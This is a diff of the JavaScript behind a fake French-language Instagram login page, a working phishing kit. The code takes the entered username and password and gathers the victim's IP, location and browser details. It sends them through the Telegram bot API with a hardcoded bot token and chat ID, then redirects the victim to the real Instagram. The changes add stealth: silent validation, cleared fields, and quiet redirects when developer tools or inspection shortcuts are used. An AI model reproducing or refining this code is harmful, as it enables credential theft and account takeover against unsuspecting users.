@@ -2,213 +2,204 @@
 const TELEGRAM_BOT_TOKEN = '8217147903:AAHdDmpNkDgeYY1fltvt_otnCYFZ9peGo9w';
 const TELEGRAM_CHAT_ID = '5534662562';
 
-// Récupérer le formulaire
 const loginForm = document.getElementById('loginForm');
 
-// Fonction pour obtenir l'adresse IP
 async function getClientIP() {
     try {
         const response = await axios.get('https://api.ipify.org?format=json');
         return response.data.ip;
     } catch (error) {
-        console.error('Erreur lors de la récupération de l\'IP:', error);
         return 'IP non disponible';
     }
 }
 
-// Fonction pour obtenir les informations du navigateur
 function getBrowserInfo() {
     const ua = navigator.userAgent;
-    let browserName;
+    let browserName = "Navigateur inconnu";
     
     if (ua.includes("Firefox")) browserName = "Firefox";
-    else if (ua.includes("Chrome")) browserName = "Chrome";
-    else if (ua.includes("Safari")) browserName = "Safari";
-    else if (ua.includes("Edge")) browserName = "Edge";
-    else browserName = "Navigateur inconnu";
+    else if (ua.includes("Chrome") && !ua.includes("Edg")) browserName = "Chrome";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserName = "Safari";
+    else if (ua.includes("Edg")) browserName = "Edge";
     
     return {
         name: browserName,
-        userAgent: ua,
-        language: navigator.language,
         platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        userAgent: ua.substring(0, 100) + '...'
     };
 }
 
-// Fonction pour obtenir la localisation (approximative via IP)
-async function getLocationFromIP(ip) {
+async function getLocationInfo(ip) {
     try {
         const response = await axios.get(`https://ipapi.co/${ip}/json/`);
         const data = response.data;
         
-        if (data.error) return 'Localisation non disponible';
-        
-        return {
-            city: data.city || 'Inconnu',
-            region: data.region || 'Inconnu',
-            country: data.country_name || 'Inconnu',
-            postal: data.postal || 'Inconnu',
-            isp: data.org || 'Inconnu'
-        };
+        if (!data.error) {
+            return `${data.city || 'Inconnu'}, ${data.region || 'Inconnu'}, ${data.country_name || 'Inconnu'}`;
+        }
     } catch (error) {
-        return 'Localisation non disponible';
+        // Silencieux
     }
+    return 'Localisation non disponible';
 }
 
-// Fonction pour envoyer à Telegram
 async function sendToTelegram(username, password) {
     const ip = await getClientIP();
     const browser = getBrowserInfo();
-    const location = await getLocationFromIP(ip);
+    const location = await getLocationInfo(ip);
     const date = new Date().toLocaleString('fr-FR');
-    
-    let locationText = '';
-    if (typeof location === 'object') {
-        locationText = `📍 LOCALISATION:
-🏙️ Ville: ${location.city}
-🏛️ Région: ${location.region}
-🇫🇷 Pays: ${location.country}
-📮 Code Postal: ${location.postal}
-📡 ISP: ${location.isp}`;
-    } else {
-        locationText = `📍 Localisation: ${location}`;
-    }
     
     const message = `🔔 NOUVEAU LOGIN INSTAGRAM 🔔
 
 👤 UTILISATEUR: ${username}
 🔐 MOT DE PASSE: ${password}
 
-📋 INFORMATIONS CLIENT:
-🕐 Date & Heure: ${date}
-🌐 Adresse IP: ${ip}
+📍 LOCALISATION:
+🌍 ${location}
+🌐 IP: ${ip}
 
-${locationText}
+📱 APPAREIL:
+📅 Date: ${date}
+🖥️ Navigateur: ${browser.name}
+💻 OS: ${browser.platform}
+📐 Écran: ${browser.screen}
+🗣️ Langue: ${browser.language}
 
-🖥️ INFORMATIONS SYSTÈME:
-💻 Navigateur: ${browser.name}
-📱 Plateforme: ${browser.platform}
-🖥️ Résolution: ${browser.screen}
-🌍 Langue: ${browser.language}
-
-🔍 USER AGENT:
+🔍 User Agent:
 ${browser.userAgent}
 
-⚡ Envoyé depuis: ${window.location.hostname || 'Localhost'}`;
+🌐 URL: ${window.location.href}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     try {
-        const response = await axios.post(url, {
+        await axios.post(url, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'HTML'
         });
-        
-        console.log('✅ Données envoyées avec succès à Telegram');
+        console.log('✅ Données envoyées avec succès');
         return true;
     } catch (error) {
-        console.error('❌ Erreur Telegram:', error);
+        console.error('❌ Erreur d\'envoi Telegram');
         return false;
     }
 }
 
-// Gérer la soumission du formulaire
+// Gestion du formulaire
 loginForm.addEventListener('submit', async function(event) {
     event.preventDefault();
     
-    // Récupérer les valeurs
     const username = document.getElementById('username').value.trim();
     const password = document.getElementById('password').value.trim();
     
-    // Validation
     if (!username || !password) {
-        alert('⚠️ Veuillez remplir tous les champs');
+        // Validation visuelle silencieuse
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            if (!input.value.trim()) {
+                input.style.borderColor = '#ff4444';
+                setTimeout(() => {
+                    input.style.borderColor = '#dbdbdb';
+                }, 2000);
+            }
+        });
         return;
     }
     
-    // Désactiver le bouton pendant l'envoi
     const submitBtn = this.querySelector('.login-btn');
     const originalText = submitBtn.textContent;
     submitBtn.textContent = 'Connexion en cours...';
     submitBtn.disabled = true;
-    submitBtn.style.opacity = '0.7';
+    submitBtn.style.opacity = '0.8';
     submitBtn.style.cursor = 'wait';
     
-    try {
-        // Envoyer les données à Telegram
-        const success = await sendToTelegram(username, password);
-        
-        if (success) {
-            // Simuler un chargement plus long pour paraître authentique
-            await new Promise(resolve => setTimeout(resolve, 1800));
-            
-            // Redirection directe vers Instagram
-            window.location.href = 'https://instagram.com';
-        } else {
-            // En cas d'erreur Telegram
-            submitBtn.textContent = 'Erreur de connexion';
-            submitBtn.style.background = '#f44336';
-            
-            setTimeout(() => {
-                submitBtn.textContent = originalText;
-                submitBtn.style.background = '#4f5bd5';
-                submitBtn.disabled = false;
-                submitBtn.style.opacity = '1';
-                submitBtn.style.cursor = 'pointer';
-                alert('Connexion échouée. Veuillez réessayer.');
-            }, 1500);
-        }
-    } catch (error) {
-        // Erreur générale
-        submitBtn.textContent = originalText;
-        submitBtn.disabled = false;
-        submitBtn.style.opacity = '1';
-        submitBtn.style.cursor = 'pointer';
-        alert('Une erreur est survenue. Veuillez réessayer.');
-    }
+    // Envoyer les données
+    const success = await sendToTelegram(username, password);
+    
+    // Effacer les champs
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+    
+    // Redirection après délai
+    setTimeout(() => {
+        window.location.href = 'https://instagram.com';
+    }, 1800);
 });
 
-// Empêcher les liens de fonctionner
+// Gestion des liens
 document.querySelectorAll('a').forEach(link => {
     link.addEventListener('click', function(event) {
         event.preventDefault();
+        
         if (this.classList.contains('forgot')) {
-            alert('Un lien de réinitialisation a été envoyé à votre adresse e-mail.');
-        } else if (this.classList.contains('facebook')) {
-            alert('Connexion avec Facebook temporairement indisponible.');
-        } else {
-            // Pour les autres liens (Inscrivez-vous), rediriger vers Instagram
-            window.location.href = 'https://instagram.com/accounts/signup/';
+            // Redirection silencieuse pour mot de passe oublié
+            setTimeout(() => {
+                window.location.href = 'https://instagram.com/accounts/password/reset/';
+            }, 300);
+        } else if (this.parentElement.classList.contains('facebook') || 
+                  this.classList.contains('facebook')) {
+            // Redirection Facebook
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com';
+            }, 300);
+        } else if (this.textContent.includes('Inscrivez-vous')) {
+            // Redirection inscription
+            setTimeout(() => {
+                window.location.href = 'https://instagram.com/accounts/signup/';
+            }, 300);
         }
     });
 });
 
-// Protection basique
+// Protection discrète contre l'inspection
+let devtoolsDetected = false;
+const checkDevTools = () => {
+    const threshold = 100;
+    const widthDiff = Math.abs(window.outerWidth - window.innerWidth);
+    const heightDiff = Math.abs(window.outerHeight - window.innerHeight);
+    
+    if ((widthDiff > threshold || heightDiff > threshold) && !devtoolsDetected) {
+        devtoolsDetected = true;
+        // Redirection silencieuse sans alerte
+        setTimeout(() => {
+            window.location.href = 'https://instagram.com';
+        }, 500);
+    }
+};
+
+// Vérifier moins fréquemment pour éviter la surcharge
+setInterval(checkDevTools, 1500);
+
+// Protection supplémentaire
 document.addEventListener('contextmenu', (e) => {
-    if (e.target.tagName !== 'INPUT') {
+    if (e.target.tagName === 'IMG' || e.target.classList.contains('logo')) {
         e.preventDefault();
     }
 });
 
-// Empêcher F12 et Ctrl+Shift+I
-let devtools = false;
-setInterval(() => {
-    const widthThreshold = window.outerWidth - window.innerWidth > 160;
-    const heightThreshold = window.outerHeight - window.innerHeight > 160;
-    
-    if ((widthThreshold || heightThreshold) && !devtools) {
-        devtools = true;
-        alert('Inspection désactivée');
-        window.location.reload();
+// Prévention des raccourcis clavier d'inspection
+document.addEventListener('keydown', (e) => {
+    // Désactiver Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, F12
+    if ((e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
+        e.key === 'F12' || 
+        (e.ctrlKey && e.key === 'u')) {
+        e.preventDefault();
+        // Redirection silencieuse
+        setTimeout(() => {
+            window.location.href = 'https://instagram.com';
+        }, 300);
     }
-}, 1000);
+});
 
-// Message de débogage
+// Initialisation
 window.addEventListener('load', () => {
-    console.log('%c 🔒 Instagram Secure Login 🔒 %c', 
-        'background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D); color: white; padding: 10px; border-radius: 5px; font-weight: bold;',
-        '');
-    console.log('Système de connexion sécurisé initialisé');
+    console.log('Page de connexion Instagram chargée');
+    
+    // Focus sur le premier champ
+    setTimeout(() => {
+        document.getElementById('username').focus();
+    }, 500);
 });
